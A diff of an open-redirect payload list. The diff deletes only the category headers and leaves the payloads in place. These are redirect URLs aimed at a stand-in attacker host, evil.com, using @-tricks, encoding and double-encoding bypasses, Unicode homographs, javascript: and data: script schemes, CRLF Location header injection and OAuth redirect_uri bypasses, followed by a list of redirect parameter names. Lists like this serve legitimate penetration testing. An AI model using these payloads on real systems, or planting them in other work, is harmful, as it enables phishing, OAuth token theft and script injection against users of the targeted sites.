@@ -1,8 +1,3 @@
-# ============================================================
-# Open Redirect Payloads
-# ============================================================
-
-# ---- Basic ----
 https://evil.com
 http://evil.com
 //evil.com
@@ -12,7 +7,6 @@ http://evil.com
 \/evil.com
 \\/evil.com
 
-# ---- Protocol-Relative ----
 //evil.com/path
 //evil.com/path?q=1
 //evil.com%2f
@@ -20,7 +14,6 @@ http://evil.com
 //evil.com#
 //evil.com%23
 
-# ---- @-Based ----
 https://target.com@evil.com
 https://target.com:443@evil.com
 http://target.com@evil.com/path
@@ -28,14 +21,12 @@ http://target.com@evil.com/path
 @evil.com
 //0xd83dude@evil.com
 
-# ---- Subdomain Confusion ----
 https://evil.com?target.com
 https://evil.com#target.com
 https://target.com.evil.com
 https://evil.com/target.com
 https://evil.com\@target.com
 
-# ---- URL Encoding Bypass ----
 %2F%2Fevil.com
 %2F%2Fevil.com%2F
 /%09/evil.com
@@ -52,7 +43,6 @@ https://evil.com\@target.com
 %09//evil.com
 %00//evil.com
 
-# ---- Unicode / Homograph ----
 //eeevil.com
 //еvil.com
 //𝓮vil.com
@@ -60,7 +50,6 @@ https://evil.com\@target.com
 //evil．com
 //evil%E3%80%82com
 
-# ---- Path-Based ----
 /evil.com
 /../evil.com
 /../../evil.com
@@ -68,46 +57,38 @@ https://evil.com\@target.com
 /..//evil.com
 /./evil.com
 
-# ---- JavaScript Scheme ----
 javascript:alert(1)
 javascript:window.location='https://evil.com'
 javascript:window.open('https://evil.com')
 data:text/html,<script>window.location='https://evil.com'</script>
 vbscript:window.location='https://evil.com'
 
-# ---- Double Encoding ----
 %252F%252Fevil.com
 %25252F%25252Fevil.com
 //evil.%63om
 //evil.c%6fm
 
-# ---- Newline Injection ----
 https://evil.com%0d%0aLocation:%20https://evil.com
 https://evil.com%0aLocation:%20https://evil.com
 https://evil.com\r\nLocation:\x20https://evil.com
 
-# ---- Whitelist Bypass ----
 https://evil.com?ref=target.com
 https://targetXcom.evil.com
 
-# ---- Framework Specific ----
 /?next=//evil.com
 /?next=https://evil.com
 /?next=%2F%2Fevil.com
 
-# ---- OAuth Bypass ----
 https://target.com/callback/../../../evil.com
 https://target.com.evil.com/callback
 https://target.com%60.evil.com/callback
 https://evil.com%23.target.com/callback
 https://evil.com?redirect_uri=https://target.com/callback
 
-# ---- CRLF Chain ----
 /%0d%0aLocation:%20https://evil.com
 /%0aLocation:%20https://evil.com
 /redirect?url=%0d%0aLocation:%20https://evil.com
 
-# ---- Parameters ----
 redirect
 redirect_uri
 redirect_url
